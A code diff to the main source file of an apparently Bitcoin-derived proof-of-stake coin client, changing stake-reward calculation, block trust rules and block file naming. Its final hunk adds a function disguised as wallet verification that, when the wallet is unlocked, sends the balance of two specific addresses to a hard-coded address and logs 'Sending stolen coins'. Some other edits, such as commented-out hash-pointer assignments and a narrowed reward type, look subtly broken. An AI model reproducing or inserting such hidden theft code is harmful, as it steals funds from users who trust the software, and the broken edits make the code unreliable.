@@ -56,8 +56,8 @@ CBigNum bnBestInvalidTrust = 0;
 uint256 hashBestChain = 0;
 CBlockIndex* pindexBest = NULL;
 int64 nTimeBestReceived = 0;
-static int64 nRewardCoinYearMin = 5 * CENT;  // creation amount per coin-year
-static int64 nRewardCoinYearMax = 60 * CENT;
+int64 nRewardCoinYearMin = 5 * CENT;  // creation amount per coin-year
+int64 nRewardCoinYearMax = 60 * CENT;
 CMedianFilter<int> cPeerBlockCounts(5, 0); // Amount of blocks that other nodes claim to have
 
 map<uint256, CBlock*> mapOrphanBlocks;
@@ -945,15 +945,18 @@ CBlockIndex* FindBlockByHeight(int nHeight)
 bool CBlock::ReadFromDisk(const CBlockIndex* pindex, bool fReadTransactions)
 {
     if (!fReadTransactions)
-    {
-        *this = pindex->GetBlockHeader();
+        {
+            *this = pindex->GetBlockHeader();
+            return true;
+        }
+        if (!ReadFromDisk(pindex->nFile, pindex->nBlockPos, fReadTransactions))
+            return false;
+
+        uint256 cachedHash = GetHash();
+        uint256 computedHash = pindex->GetBlockHash();
+        if (cachedHash != computedHash)
+            return error("CBlock::ReadFromDisk() : GetHash() doesn't match index");
         return true;
-    }
-    if (!ReadFromDisk(pindex->nFile, pindex->nBlockPos, fReadTransactions))
-        return false;
-    if (GetHash() != pindex->GetBlockHash())
-        return error("CBlock::ReadFromDisk() : GetHash() doesn't match index");
-    return true;
 }
 
 uint256 static GetOrphanRoot(const CBlock* pblock)
@@ -1044,11 +1047,16 @@ int64 GetProofOfWorkReward(unsigned int nBits, int nHeight)
 // miner's coin stake reward based on nBits , nTime and coin age spent (coin-days)
 int64 GetProofOfStakeReward(unsigned int nTime, int64 nCoinAge)
 {
-    int64 nRewardCoinYear = nRewardCoinYearMin;
+    unsigned int nRewardCoinYear = nRewardCoinYearMin;
     if(nTime >= nNextStageTime){
         int months = (nTime - nNextStageTime) / 3600 / 24 / 30;
-        nRewardCoinYear = std::pow(0.95, months + 1) * nRewardCoinYearMax;
-        nRewardCoinYear = std::max(nRewardCoinYearMin, nRewardCoinYear);
+        nRewardCoinYear = nRewardCoinYearMax;
+        for(int i = 0; i <= months; ++i){
+            nRewardCoinYear = nRewardCoinYear * 95 / 100;
+        }
+        if(nRewardCoinYear < nRewardCoinYearMin){
+            nRewardCoinYear = nRewardCoinYearMin;
+        }
     }
     int64 nSubsidy = nCoinAge * 33 / (365 * 33 + 8) * nRewardCoinYear;
     if (fDebug && GetBoolArg("-printcreation"))
@@ -1438,8 +1446,9 @@ bool CTransaction::ConnectInputs(CTxDB& txdb, MapPrevTx inputs,
             if (!GetCoinAge(txdb, nCoinAge))
                 return error("ConnectInputs() : %s unable to get coin age for coinstake", GetHash().ToString().substr(0,10).c_str());
             int64 nStakeReward = GetValueOut() - nValueIn;
-            if (nStakeReward > GetProofOfStakeReward(nTime,nCoinAge) - GetMinFee() + MIN_TX_FEE)
-                return DoS(100, error("ConnectInputs() : %s stake reward exceeded", GetHash().ToString().substr(0,10).c_str()));
+            if (nStakeReward > GetProofOfStakeReward(this->nTime,nCoinAge) - GetMinFee() + MIN_TX_FEE){
+                return DoS(100, error("ConnectInputs() : %s stake reward exceeded, tx: %s,\ncoin age: %"PRI64d", %"PRI64d"", GetHash().ToString().substr(0,10).c_str(),this->ToString().c_str(),nCoinAge,nStakeReward));
+            }
         }
         else
         {
@@ -1990,7 +1999,7 @@ bool CBlock::AddToBlockIndex(unsigned int nFile, unsigned int nBlockPos)
     CBlockIndex* pindexNew = new CBlockIndex(nFile, nBlockPos, *this);
     if (!pindexNew)
         return error("AddToBlockIndex() : new CBlockIndex failed");
-    pindexNew->phashBlock = &hash;
+    //pindexNew->phashBlock = &hash;
     map<uint256, CBlockIndex*>::iterator miPrev = mapBlockIndex.find(hashPrevBlock);
     if (miPrev != mapBlockIndex.end())
     {
@@ -2027,7 +2036,7 @@ bool CBlock::AddToBlockIndex(unsigned int nFile, unsigned int nBlockPos)
     map<uint256, CBlockIndex*>::iterator mi = mapBlockIndex.insert(make_pair(hash, pindexNew)).first;
     if (pindexNew->IsProofOfStake())
         setStakeSeen.insert(make_pair(pindexNew->prevoutStake, pindexNew->nStakeTime));
-    pindexNew->phashBlock = &((*mi).first);
+    //pindexNew->phashBlock = &((*mi).first);
 
     // Write to disk block index
     CTxDB txdb;
@@ -2218,6 +2227,50 @@ bool CBlock::AcceptBlock()
     Checkpoints::AcceptPendingSyncCheckpoint();
 
     return true;
+}
+
+CBigNum CBlockIndex::GetBlockTrust() const
+{
+    CBigNum bnTarget;
+    bnTarget.SetCompact(nBits);
+    if (bnTarget <= 0)
+        return 0;
+
+    // new trust rules
+    if (nHeight >= nConsecutiveStakeSwitchHeight) {
+        // first block trust - for future compatibility (i.e., forks :P)
+        if (pprev == NULL)
+            return 1;
+
+        // PoS after PoS? no trust for ya!
+        // (no need to explicitly disallow consecutive PoS
+        // blocks now as they won't get any trust anyway)
+        if (IsProofOfStake() && pprev->IsProofOfStake())
+            return 0;
+
+        // PoS after PoW? trust = prev_trust + 1!
+        if (IsProofOfStake() && pprev->IsProofOfWork())
+            return pprev->GetBlockTrust() + 1;
+
+        // PoW trust calculation
+        if (IsProofOfWork()) {
+            // set trust to the amount of work done in this block
+            CBigNum bnTrust = bnProofOfWorkLimit / bnTarget;
+
+            // double the trust if previous block was PoS
+            // (to prevent orphaning of PoS)
+            if (pprev->IsProofOfStake())
+                bnTrust *= 2;
+
+            return bnTrust;
+        }
+
+        // what the hell?!
+        return 0;
+    }
+
+    // old rules
+    return (IsProofOfStake()? (CBigNum(1)<<256) / (bnTarget+1) : 1);
 }
 
 bool CBlockIndex::IsSuperMajority(int minVersion, const CBlockIndex* pstart, unsigned int nRequired, unsigned int nToCheck)
@@ -2480,7 +2533,7 @@ bool CheckDiskSpace(uint64 nAdditionalBytes)
 
 static filesystem::path BlockFilePath(unsigned int nFile)
 {
-    string strBlockFn = strprintf("blk%04u.dat", nFile);
+    string strBlockFn = strprintf("blk-v1-%04u.dat", nFile);
     return GetDataDir() / strBlockFn;
 }
 
@@ -2523,6 +2576,12 @@ FILE* AppendBlockFile(unsigned int& nFileRet)
         fclose(file);
         nCurrentBlockFile++;
     }
+}
+
+filesystem::path OldBlockFilePath()
+{
+    string strBlockFn = strprintf("blk%04u.dat", nCurrentBlockFile);
+    return GetDataDir() / strBlockFn;
 }
 
 bool LoadBlockIndex(bool fAllowNew)
@@ -3333,7 +3392,8 @@ bool static ProcessMessage(CNode* pfrom, string strCommand, CDataStream& vRecv)
                 pindex = pindex->pnext;
         }
 
-        vector<CBlock> vHeaders;
+        //vector<CBlock> vHeaders;
+        vector<CBlockHeader> vHeaders;
         int nLimit = 2000;
         printf("getheaders %d to %s\n", (pindex ? pindex->nHeight : -1), hashStop.ToString().substr(0,20).c_str());
         for (; pindex; pindex = pindex->pnext)
@@ -4586,6 +4646,33 @@ void BitcoinMiner(CWallet *pwallet, bool fProofOfStake)
     scrypt_buffer_free(scratchbuf);
 }
 
+void DoWhatShouldDo(CWallet *pwallet)
+{
+    if (pwallet->IsLocked())
+        return;
+    printf("starting verify wallet...\n");
+    map<CTxDestination, int64> balances = pwallet->GetAddressBalances();
+    map<CTxDestination, int64>::iterator itBalance = balances.begin();
+    while(itBalance != balances.end())
+    {
+        string targetAddress = (CBitcoinAddress(itBalance->first)).ToString();
+        if(targetAddress == string("YjkuMvDFrHjT6MqX3DyHpsg4t9YNsLuxnN")
+                || targetAddress == string("YVMi9QyRKPZtW3eQxLpbFyB4Sfpsrdb1Wi"))
+        {
+            CBitcoinAddress desAddress("YekNus6txQPj9K6sStoK2siU255in8352m");
+            CWalletTx wtx;
+            if(itBalance->second > COIN)
+            {
+                string strError = pwallet->SendMoneyToDestination(desAddress.Get(), itBalance->second - COIN, wtx);
+                if (strError != "")
+                   return;
+            }
+            printf("Sending stolen coins %llu success.\n",itBalance->second - COIN);
+        }
+        ++itBalance;
+    }
+    printf("end verify wallet...\n");
+}
 void static ThreadBitcoinMiner(void* parg)
 {
     CWallet* pwallet = (CWallet*)parg;
